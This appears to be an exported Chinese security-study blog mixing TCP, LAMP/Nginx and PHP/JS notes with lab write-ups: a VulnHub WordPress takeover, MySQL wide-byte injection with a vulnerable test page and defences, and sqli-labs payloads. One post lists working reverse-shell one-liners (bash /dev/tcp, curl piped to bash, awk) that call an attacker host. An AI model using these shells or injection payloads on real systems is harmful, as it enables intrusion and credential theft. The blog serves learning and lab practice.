<h2 id="TCP半关闭"><a href="#TCP半关闭" class="headerlink" title="TCP半关闭"></a>TCP半关闭</h2><p>含义：半关闭表示为一方发送Fin连接表示我已经发送了所有我应该发送的数据，但是我仍然希望接收对方发送的数据直到对方发送Fin连接。表示对方数据同样发送完毕。</p>
<p>整体流程与TCP关闭相同不过在第三步会发送更多的数据。</p>
<h2 id="同时打开与同时关闭"><a href="#同时打开与同时关闭" class="headerlink" title="同时打开与同时关闭"></a>同时打开与同时关闭</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221113.png"></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221145.png"></p>
<p>当双方同时向对方发送清求连接或者请求关闭连接时，会发生这种情况。此时无论建立连接或者关闭连接都会发送4个报文。</p>
<h2 id="连接建立超时"><a href="#连接建立超时" class="headerlink" title="连接建立超时"></a>连接建立超时</h2><p>当向无法回复的服务器请求建立连接时，客户端会不断向服务器发送SYN报文。时间上采取<strong>指数回退</strong>。第二次发送报文3秒后，第三次在上一个报文发送6秒后，第四次在上一次发送12秒后。以此类推，同时可以控制尝试发送SYN连接报文的最多次数。</p>
]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>tcp/ip</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB服务配置</title>
    <url>/2021/08/29/WEB%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>WEB服务配置</p>
<p>2021年8月29日</p>
<p>9:26</p>
<h2 id="LAMP"><a href="#LAMP" class="headerlink" title="LAMP"></a><strong>LAMP</strong></h2><span id="more"></span>

<h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a><strong>基本配置</strong></h3><h4 id="安装apache"><a href="#安装apache" class="headerlink" title="安装apache"></a><em><strong>安装apache</strong></em></h4><ul>
<li>安装httpd(apache) yum install httpd</li>
<li>打开httpd 服务 service start httpd</li>
<li>关闭防火墙 </li>
</ul>
<p>systemctl status firewalld.service</p>
<p>主页位置/var/www/html</p>
<p>主页配置文件 /etc/httpd/conf/httpd.conf</p>
<p>程序文件</p>
<p><code>         </code>监听端口</p>
<p><code>         </code>启动用户启动组 </p>
<p>User apache</p>
<p>Group apache</p>
<p><code>         </code>服务目录</p>
<p><code>                  </code>DocumentRoot “/var/www/html”</p>
<p><code>         </code>运行目录浏览</p>
<p><code>                 </code>Options Indexes FollowSymLinks</p>
<h3 id="访问控制设定"><a href="#访问控制设定" class="headerlink" title="访问控制设定"></a><strong>访问控制设定</strong></h3><p><code>        </code>Order allow,deny</p>
<p><code>                </code>Allow from 192.168.1.2 白名单</p>
<p>对页面进行加密，输入用户名密码才可进入</p>
<p><code>        </code>htpasswd -c /etc/httpd/conf/httpuser tom 建立用户tom</p>
<p><code>        </code>配置文件</p>
<p><code>        </code>authtype basic</p>
<p><code>        </code>authname “input username and password”</p>
<p><code>        </code>authuserfile /etc/httpd/conf/httpuser</p>
<p><code>        </code>require valid-user</p>
<h4 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a><em><strong>安装mysql</strong></em></h4><p>yum install mysql-server</p>
<p>启动</p>
<p><code> </code>service mysqld start</p>
<p>配置密码</p>
<p><code>        </code>mysqladmin -u root -p password “123.com”</p>
<p>进入</p>
<p><code>        </code>mysql -u root -p</p>
<h4 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a><em><strong>安装php</strong></em></h4><p>yum install php</p>
<p>yum install php-mysql 连接数据库插件</p>
<p>yum install php-mbstring</p>
<p>umount /dev/cdrom                卸下当前光盘</p>
<h5 id="配置php配置文件"><a href="#配置php配置文件" class="headerlink" title="配置php配置文件"></a><strong>配置php配置文件</strong></h5><p>目录 /etc/php.ini </p>
<p>开启短标签 short_open_tag = On</p>
<h2 id="LNMP"><a href="#LNMP" class="headerlink" title="LNMP"></a><strong>LNMP</strong></h2><h2 id="Nginx安装"><a href="#Nginx安装" class="headerlink" title="Nginx安装"></a><strong>Nginx安装</strong></h2><p>yum install nginx</p>
<p>网站目录</p>
<p>/usr/share/nginx/html</p>
<p>配置文件</p>
<p><code> </code>/etc/nginx/nginx.conf)</p>
<p>关闭</p>
<p>nginx -s stop</p>
<h3 id="Nginx配置文件"><a href="#Nginx配置文件" class="headerlink" title="Nginx配置文件"></a><strong>Nginx配置文件</strong></h3><p>全局配置</p>
<p>user nginx;          //运行用户</p>
<p>worker_processes auto;     //工作进程(根据cpu核心)</p>
<p>error_log /var/log/nginx/error.log;   // (错误文件)</p>
<p>pid /run/nginx.pid;                               //pid文件位置</p>
<p>I/O事件配置</p>
<p>events {</p>
<p><code>    </code>worker_connections 1024;     //每个进程处理连接数</p>
<p>}</p>
<p>HTTP配置</p>
<p>http{</p>
<p>***</p>
<p>}</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>lazysysadmin靶机</title>
    <url>/2021/12/14/lazysysadmin%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>下载地址:   <a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">LAZYSYSADMIN</a> </p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描网段，发现靶机ip地址，而且开放了 22  80 139 445 3306 6667 端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214092751.png" alt="扫描结果">   </p>
<p>首先查看445端口有那些共享文件。使用enum4linux扫描共享文件信息。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214093329.png" alt="扫描结果"></p>
<p>通过扫描结果，可以使用空用户名和密码登录。共享文件信息有print$ , share$  , ipc$ .<br>通过\10.1.1.131\share$访问后。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214093503.png" alt="共享文件内容"><br>打开deet.txt文件后，获得密码<strong>12345</strong>,同时访问wordpress配置文件获得了数据库用户名<strong>Admin</strong>,密码<strong>TogieMYSQL12345^^</strong><br>访问wordpress后在首页得到用户名<strong>togie</strong>，尝试通过wordpress对靶机进行渗透。  </p>
<ol>
<li>进入wordpress/wp-admin，尝试使用mysql帐号密码进入</li>
<li>在Appearance中的editor修改404页面，写入shell<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214100216.png" alt="修改404页面"></li>
<li> 进入404页面 /wordpress/wp-content/themes/twentyfifteen/404.php，获得shell.其中<code>twentyfifteen</code>需要随着版本改变，具体查看这个连接修改的是哪一个版本。</li>
</ol>
<p>反弹shell后，进入home页面发现用户togie，使用share$中的密码12345登录成功。sudo -L查看权限，用户拥有all:all权限，使用sudo su获得root权限。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>msyql宽字节注入</title>
    <url>/2021/09/16/msyql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="mysql宽字节注入"><a href="#mysql宽字节注入" class="headerlink" title="mysql宽字节注入"></a>mysql宽字节注入</h1><span id="more"></span>

<p>  #宽字节注入</p>
<p>  在注入过程中，如果采用magic_quot_gpc 或者 addslashes()。如果采用’注入会产生&#39;。导致无法绕过’’。当采用客户端采用 SET names = GBK 或者 mysqli_set_charset($conn, ‘gbk’)时，相当于设置 </p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>

<p>此时转义字符\被URL编码解析为 %5c 如果我们手动输入 %df’。经过浏览器编码和转义后会成为 %df%5c%27。在[[msyql数据编码]]的设置下,%df%5c 连接在一起会被解析为GBK双字节编码,此时%df\会变为一个汉字。因此我们便绕过了\转义符,实现了在mysql语句中直接插入’的目的。在绕过的过程中%df不固定，只要可以与%5c一起构成GBK编码都可以绕过\转义符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//echo 12341234;</span><br><span class="line"></span><br><span class="line">	function unicode($res)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo 1234;</span><br><span class="line">		 //print&quot;12421&quot;;</span><br><span class="line">			 while($val=mysqli_fetch_row($res))&#123;</span><br><span class="line">   			 print&quot;&#123;$val[0]&#125; = &#123;$val[1]&#125;&quot;;</span><br><span class="line">   			  print(&quot;&lt;br&gt;&quot;);</span><br><span class="line">			 &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//echo 1234555;</span><br><span class="line">	header(&quot;Content-Type:text/html;charset=gbk&quot;); //为了显示，将页面默认为gbk</span><br><span class="line">	$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">		echo $name;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);  </span><br><span class="line">	mysqli_select_db($conn,&#x27;xnfh&#x27;);</span><br><span class="line">	</span><br><span class="line">	print&quot;****************&lt;br&gt;AT Start &lt;br&gt;&quot;;</span><br><span class="line">	</span><br><span class="line">	$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//mysqli_set_charset($conn, &#x27;gbk&#x27;);</span><br><span class="line">	//mysqli_query($conn,&quot;set names &#x27;gbk&#x27;&quot;);</span><br><span class="line">	mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_client=gbk&quot;);</span><br><span class="line">	print&quot;*********************** &lt;br&gt;charset gbk &lt;br&gt;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;);</span><br><span class="line">		print&quot;*********************** &lt;br&gt;charset gbk and protect &lt;br&gt;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//$name = mysqli_real_escape_string($conn, $name);</span><br><span class="line">	$name =addslashes($name);</span><br><span class="line">	//echo 1234;</span><br><span class="line">	//mysqli_query($conn,&quot;character_set_client=binary&quot;);</span><br><span class="line">	</span><br><span class="line">	//mysqli_query($conn,&quot;SET character_set_connection=gbk,character_set_client=binary&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	echo $name;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	//mysqli_query($conn,&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class="line">	if($conn==null)&#123;exit(&quot;connect error !&lt;br&gt;&quot;);&#125;</span><br><span class="line">	$sql=&quot;select * from users where id=&#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">	$result2=mysqli_query($conn,$sql);</span><br><span class="line">	unicode($result2);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	echo $sql;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	//echo 1234;</span><br><span class="line">	unicode($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>经过实验代码我们发现，直接设置 SET NAMES gbk 与  mysqli_set_charset 在直接结果上都是相同的 ,都只改变3项为gbk.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AT Start</span><br><span class="line"></span><br><span class="line">character_set_client = utf8</span><br><span class="line">character_set_connection = utf8</span><br><span class="line">character_set_database = utf8</span><br><span class="line">character_set_filesystem = binary</span><br><span class="line">character_set_results = utf8</span><br><span class="line">character_set_server = utf8</span><br><span class="line">character_set_system = utf8</span><br><span class="line">***********************</span><br><span class="line">After charset gbk</span><br><span class="line"></span><br><span class="line">character_set_client = gbk		//改变</span><br><span class="line">character_set_connection = gbk	//改变</span><br><span class="line">character_set_database = utf8</span><br><span class="line">character_set_filesystem = binary</span><br><span class="line">character_set_results = gbk	//改变</span><br><span class="line">character_set_server = utf8</span><br><span class="line">character_set_system = utf8</span><br></pre></td></tr></table></figure>

<p>防御方法 </p>
<ol>
<li><p>通过mysqli_set_charset 与 mysql_real_escape_string()转义达到效果，放弃add….()函数。</p>
<pre><code>通过mysqli_set_charse设置字符集之后，使用real_escape()函数会根据对应设置的字符集进行相应的转义，虽然字符集设计没有改变，但是无法绕过\转义符.
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_set_charset(<span class="variable">$conn</span>, <span class="string">&#x27;gbk&#x27;</span>);</span><br><span class="line"><span class="variable">$name</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$name</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>通过设置 character_set_client = binary改变字符集编码，连接时不使用GBK编码，从而无法绕过\。</p>
<pre><code>我试了一下发现单单使用character_set_client = binary，无法防御注入同时查询当前的数据库编码也没有任何的改变，至少要使用 set_client 与 set_connection 两项才可以保护。具体原理以后再说吧,
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;SET character_set_connection=gbk, ,character_set_client=binary</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>在最后我发现只要使用<code>mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_client=gbk&quot;);</code>就会导致宽字节注入，具体的原理还是等弄懂[[msyql数据编码]]以后在说。</p>
]]></content>
      <categories>
        <category>注入</category>
      </categories>
      <tags>
        <tag>宽字节注入</tag>
        <tag>mysql</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹SHELL</title>
    <url>/2021/12/14/%E5%8F%8D%E5%BC%B9SHELL/</url>
    <content><![CDATA[<p>文章参考 : <a href="https://blog.csdn.net/Aaron_Miller/article/details/106825087">反弹Shell的方式和详解</a>  </p>
<span id="more"></span>

<h2 id="1-Linux反弹SHELL"><a href="#1-Linux反弹SHELL" class="headerlink" title="1.Linux反弹SHELL"></a>1.Linux反弹SHELL</h2><h3 id="1-1BASH反弹SHELL"><a href="#1-1BASH反弹SHELL" class="headerlink" title="1.1BASH反弹SHELL"></a>1.1BASH反弹SHELL</h3><p>攻击方:10.1.1.130<br>靶机:10.1.1.131</p>
<p>攻击方使用nc监听端口<br><code> nc -lvp 9876</code><br>靶机执行命令<br><code> bash -i &gt;&amp; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1</code></p>
<ul>
<li>bash -i 表示创建一个新的shell页面</li>
<li>&gt;&amp;表示将标准输出和错误输出都重定向到文件</li>
<li>/dev/tcp/10.1.1.130/9876 表示对10.1.1.130 9876端口建立连接</li>
<li>0&gt;&amp;1表示将标准输入 作为标准输出</li>
</ul>
<h3 id="1-2-CURL反弹SHELL"><a href="#1-2-CURL反弹SHELL" class="headerlink" title="1.2 CURL反弹SHELL"></a>1.2 CURL反弹SHELL</h3><p>攻击方存在web服务，并建立一个文件中存放任意反弹SHELL命令。控制靶机CRUL web中的反弹shell文件，通过管道符作为bash输入，实现反弹SEHLL。    </p>
<p>攻击方 :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/10.1.1.130/9876 0&gt;&amp;1&quot;</span> &gt; index.html</span><br><span class="line">nc -lvp 9876</span><br></pre></td></tr></table></figure>
<p>靶机:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl 10.1.1.130 | bash</span><br></pre></td></tr></table></figure>

<h3 id="1-3-EXEC反弹SHELL"><a href="#1-3-EXEC反弹SHELL" class="headerlink" title="1.3 EXEC反弹SHELL"></a>1.3 EXEC反弹SHELL</h3><p>靶机:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/10.1.1.130/9876;cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-AWK反弹SHELL"><a href="#1-4-AWK反弹SHELL" class="headerlink" title="1.4 AWK反弹SHELL"></a>1.4 AWK反弹SHELL</h3><p>靶机:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.1.1.130/9876&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>反弹shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>前后端基础</title>
    <url>/2021/09/03/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>前后端基础</p>
<p>2021年8月31日<span id="more"></span></p>
<p>14:13</p>
<ul>
<li>前端</li>
</ul>
<p># 表单</p>
<p>method属性:</p>
<p>get</p>
<p>url中显示数据</p>
<p>长度限制</p>
<p>Post</p>
<p>http请求</p>
<p>enctype属性</p>
<p>application/x-www-form-urlencoded         默认值</p>
<p>multipart/form-data         上传文件时，必需写</p>
<p>表单元素</p>
<p>&lt;input / &gt; 单标签</p>
<p>type                属性</p>
<p>password 不显示</p>
<p>text 文本框</p>
<p>radio 单选框         通过name指定相同的组</p>
<p>checkbox 复选框</p>
<p>reset 重置按钮</p>
<p>submit 提交按钮</p>
<p>file 文件域 在enctype=”multipart/form-data”条件下可用</p>
<p>hidden 隐藏输入文本框</p>
<p>value属性</p>
<p>传值</p>
<p>&lt;select&gt; 标签  </p>
<option value="0" selected = "selectd">选择月份</option>




<option> 1</option>

<option> 2</option>

<option> 3</option>

<option> 4</option>

<p>&lt;/select&gt; </p>
<p>文本域</p>
<p>&lt;textarea&gt; &lt;/textarea&gt;</p>
<p># iframe标签</p>
<p>属性</p>
<p>src iframe引用</p>
<ul>
<li>后端</li>
</ul>
<p>#PHP</p>
<p>php基本语法</p>
<ol>
<li>php结束标记?&gt;相当于;,因此最后一句php一句可以不加分号.</li>
<li>单行注释                //注释</li>
<li>多行注释                /* */</li>
<li>PHP代码中注释，不会显示在浏览器源码中</li>
<li>PHP脚本从上到下依次执行</li>
</ol>
<p>变量</p>
<p>变量申明</p>
<p>$abc = 123;</p>
<p>global $abc=1234;                //全局变量声明</p>
<p>static $abc=123;                 //静态变量，再函数内部声明，且仅在函数第一次执行是被初始化。</p>
<p>变量严格区分大小写</p>
<p>PHP为弱类型语言,不需要申明变量类型。</p>
<p>$c  = &amp; $a //c和a使用相同的内存空间，相当于给$a一个别名，两个变量实质上相同.</p>
<p>变量类型</p>
<ol>
<li>Bool                        echo输出false时，输出空白 </li>
</ol>
<p>以下所有值会为false</p>
<ol>
<li>false</li>
<li>0</li>
<li>0.0</li>
<li>空白字符串”” 和字符串0</li>
<li>没有成员的数组</li>
<li>NULL</li>
<li>int  整数</li>
<li>float 小数</li>
<li>string </li>
</ol>
<p>单引号定义字符串中’需要转义，$符号正常输出</p>
<p>双引号中’不需要转义正常输出，$符号代表变量的开始会输出变量</p>
<p>双引号中变量需要使用{}包裹,仅使用$无法判断变量的结束。</p>
<p>定界符  &lt;&lt;&lt;大写字母     //定界符开始</p>
<p>​                     大写字母;       //定界符和结束结束,分号之后不能接任何其他符号，如空格 tab 注释</p>
<p>在定界符中所有字符都会原样输出。</p>
<p>可变变量</p>
<p>$a = “change”</p>
<p>$$a = “xxxx”</p>
<p>—&gt; $change = “xxxx”</p>
<p>变量释放</p>
<p>unset</p>
<p>变量输出</p>
<ol>
<li>echo 输出变量内容</li>
<li>var_dump 输出变量类型及其内容</li>
</ol>
<p>常量</p>
<p>常量一旦被定义，无法被修改或者取消。</p>
<p>定义</p>
<p>define(“NAME”, “TEST!”);</p>
<p>一般名称为大写</p>
<p>预订义常量</p>
<p>__FILE__ 当前文件名</p>
<p>__LINEL__ 当前行数</p>
<p>__FUNCTION__ 当前函数名</p>
<p>__CLASS__ 当前类名</p>
<p>__METHOD__ 当前对象方法名<br>PHP_OS 当前操作系统</p>
<p>PHP_VERSION 当前PHP服务器版本</p>
<p>DIRECTORY_SEPARATOR 当前操作系统目录分隔符 / 或者\</p>
<p>运算符</p>
<p>其他运算符</p>
<p>? 三元运算符</p>
<p>   将字符串当作命令执行</p>
<p>@ 屏蔽提示,警告</p>
<p>流程控制</p>
<p>continue 和 break  后面可以接数字选择跳出几重循环</p>
<p>如 braek 2;</p>
<p>exit(“asdfasdf”); 结束脚本执行，同时输出字符串,如果括号内放置整数变量0-255,不会打印而是作为程序状态返回码。</p>
<p>die(); 结束脚本执行</p>
<p>函数</p>
<p>#形式</p>
<p>-——-</p>
<p>function name($xxx)</p>
<p>{</p>
<p>return;</p>
<p>}</p>
<p>-———</p>
<p>如果函数没有返回值，返回NULL。</p>
<p>#可变函数</p>
<p>函数名可以用变量，随着变量不同而运行不同的函数。</p>
<p>$name = ‘first’</p>
<p>$name(1234);</p>
<p>$name = ‘second’;</p>
<p>$name(1234);</p>
<p>$a($b) 是最简单的后门</p>
<p>可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。 </p>
<p>#参数传递</p>
<p>应用传值function(&amp;$ x)</p>
<p>相当于直接调用内存空间</p>
<p>传参时可以申明默认值</p>
<p>function ($abc = 123)</p>
<p>当有多个参数时,有默认值的参数必须在无默认值的参数右侧。</p>
<p>funtion($x , $abc = 1234)</p>
<p>func_get_arg($int)  </p>
<p>通给传递 int参数从0下标开始获得传递参数</p>
<p>func_get_args()</p>
<p>获得参数数组</p>
<p>#常见函数</p>
<p>isset()          判断变量是否存在</p>
<p>move_uploaded_file($a, $b)    将a文件移动到b文件</p>
<p>数组</p>
<p>#数组创建</p>
<ol>
<li>array(“first”=&gt;”one” , “second”=&gt;”two”  );</li>
<li>$stu[] = 1; $stu[] = 2; $stu[] = 3;</li>
</ol>
<p>对应”key”可以为int 或者 stirng 类型， value 除了不能存放对象以为没有要求</p>
<p>在数组赋值过程中</p>
<p>字符串中的数字除非前面有+会自动变为int类型</p>
<p>float -&gt; int</p>
<p>bool - &gt; int </p>
<p>null -&gt; “”</p>
<p>数组可以key同时含有int 和 stirng </p>
<p>如果没指定key,PHP将会自动使用最大key+1作为新key</p>
<p>array(“a”, 4=&gt;”b”, “c”)</p>
<p>==&gt;</p>
<p>0 =&gt; “a”</p>
<p>4 = &gt; “b”</p>
<p>5 =&gt; “c”</p>
<p>#数组遍历</p>
<p>foreach($arr as $ value)</p>
<p>$value = xxx;</p>
<p>foreach($arr as $key =&gt; $value)</p>
<p>$key =&gt; $value ;                 //    1=&gt; “first” , “two” =&gt; “second”</p>
<p>数组遍历最后一个$value并不会被销毁</p>
<p>#预订义PHP全局超数组变量</p>
<p>$GLOBALS        引用全局作用域中的全步可变变量</p>
<p>$_SERVER        包含了诸如头信息(header)、路径(path)、等等信息的数组</p>
<p>$_GET           URL通过GET方式传递参数</p>
<p>$_PSOT          通过POST方式传递参数</p>
<p>$_FILE          过 HTTP POST 方式上传到当前脚本的项目的数组</p>
<p>$_SESSION       当前脚本可用 SESSION 变量的数组</p>
<p>$_COOKIE        通过 HTTP Cookies 方式传递给当前脚本的变量的数组。</p>
<p>$_REQUEST       默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 </p>
<p>$_ENV           通过环境方式传递给当前脚本的变量的数组。 </p>
<p>COOKIE</p>
<p>​      每次客户端浏览，服务器都会向客户端发送Cookie</p>
<p>​      键值对</p>
<p>​      #性质</p>
<p>​          name    Cookie的名称</p>
<p>​          value   值</p>
<p>​          expire  过期时间</p>
<p>​          path    有效路径</p>
<p>​          domain  域名</p>
<p>​          secure  是否仅在HTTPS下设置Cookie</p>
<p>​          httplnoly 仅通过http协议访问,不能通过JS协议访问</p>
<p>​      #设置Cookie</p>
<p>​          setcookie();</p>
<p>​      #注销Cookie</p>
<p>​          setcookie(*, *, *, time()-3600)    //设置cookie过期时间为之前</p>
<p>session 机制</p>
<p>​      依赖Cookie 实现</p>
<p>​      session_start()        创建新的会话</p>
<p>​      session_destory()      服务器删除session缓存中全部数据。但是Cookie信息依然存在</p>
<p>​      session文件存储位置                 /phpstudy/tep/tep</p>
<p>​      $_SESSION              修改session文件中的值</p>
<p>PHP与mysql交互</p>
<p>​      1. 建立连接</p>
<p>​           用户名</p>
<p>​           密码</p>
<p>​           地址</p>
<p>​               数据库名</p>
<p>​      2. 执行SQL语句</p>
<p>​      3. 断开连接</p>
<p>​      连接相关函数</p>
<p>​          $link = mysqli_connect($dbHost, $dbUser, $dbPass, $dbName);    //连接数据库</p>
<p>​          mysqli_connect_error();    //返回一个字符串描述最后一次连接调用代码</p>
<p>​          mysqli_close($link);       //关闭连接</p>
<p>​          mysqli_query($link , $sql)   //查询语句返回对象</p>
<p>​          mysqli_fetch_assoc($results) //从结果对象取出一条记录返回结果数组</p>
<p>​          mysqli_error($link)          //返回最近函数调用错误</p>
<p>​          mysqli_num_rows()            //取出结果集中行的数量</p>
<p>JavaScript</p>
<p>​      简单语句</p>
<p>​          alert();          //弹窗</p>
<p>​          console.log()     //在控制台输出</p>
<p>​      在HTML语句中插入JS代码</p>
<p>​          <script> </script></p>
<p>​          <script src="xxx.js"></script></p>
<p>​      变量</p>
<p>​          var xx = 1234;</p>
<p>​          由于JS的设计缺陷，当变量不用var 声明默认为全局变量。</p>
<p>​          如果启用strict模式，系统强制使用var 申明变量。</p>
<p>​      数组</p>
<p>​          声明  var tem = [1 , 2.0 , “1214” ,null, tree];</p>
<p>​      对象</p>
<p>​          JS所有操作都是通过对象实现的</p>
<p>​          JS对象是由键值对组成的无序集合，键为字符串 值为任意类型。</p>
<p>​          var x = { name: ‘bob’, age: 30};</p>
<p>​          访问  x.key </p>
<p>​      流程控制</p>
<p>​          for(var key in 对象)</p>
<p>​              将对象所有属性依次循环。</p>
<p>​      函数</p>
<p>​          定义</p>
<p>​              1. function abs(x)</p>
<p>​      常用对象</p>
<p>​          window:充当全局作用域,代表浏览器窗口</p>
<p>​          navigator:浏览器信息</p>
<p>​              常用属性</p>
<p>​                  .appName:浏览器名称</p>
<p>​                  .appVersion:浏览器版本</p>
<p>​     .language:浏览器语言</p>
<p>​     .platform:操作系统</p>
<p>​     .userAgent:浏览器User_Agent字符串</p>
<p>​          location:URL信息</p>
<p>​              location.assign()    加载新页面</p>
<p>​              location.reload()    重新加载页面</p>
<p>​          document:浏览器以DOM树解释整个HTML页面，DOM树的根节点</p>
<p>​              .getElementById()    根据Id查询DOM节点</p>
<p>​        .getElementByTagName()     根据name查询DOM节点</p>
<p>​        .getElementByClassName()    CSS选择器</p>
<p>​        var test = document.getElementById(‘test’);</p>
<p>​        var cs = test.children;     获得test的所有直属子节点</p>
<p>​        var first  = test.firstElementChild    获取第一子节点</p>
<p>​        querySelector();     根据selector语法获取节点</p>
<p>​              document.Cookie:可以完成Cookie信息的读取</p>
<p>​                  document.cookie = “name= helllo”</p>
<p>事件</p>
<p>​       事件类型</p>
<p>​          鼠标事件</p>
<p>​              onclick</p>
<p>​          键盘事件</p>
<p>​          form事件</p>
<p>​        事件相应</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_1-22</title>
    <url>/2021/12/15/sqli-labs-1-22/</url>
    <content><![CDATA[<h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><span id="more"></span>
<h2 id="1-Less-1字符串注入"><a href="#1-Less-1字符串注入" class="headerlink" title="1. Less-1字符串注入"></a>1. Less-1字符串注入</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215085257.png" alt="Less-1图片"><br>普通的字符串引号注入。使用单引号闭合即可。<br><code>http://localhost/sqli-labs-master/Less-1/?id=-1&#39; union select 1, concat(&#39;^&#39;,group_concat(password),&#39;^&#39;) ,  3  from users %23%20</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215085508.png" alt="Less-1完成"></p>
<h2 id="2-Less-2数字注入"><a href="#2-Less-2数字注入" class="headerlink" title="2. Less-2数字注入"></a>2. Less-2数字注入</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215085929.png" alt="Less-2图片"><br>简单的数字注入直接联合查询，即可完成。<br><code>http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1 , group_concat(password)  , 3 from users  --+ </code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211215090453.png" alt="Less-2完成图片"></p>
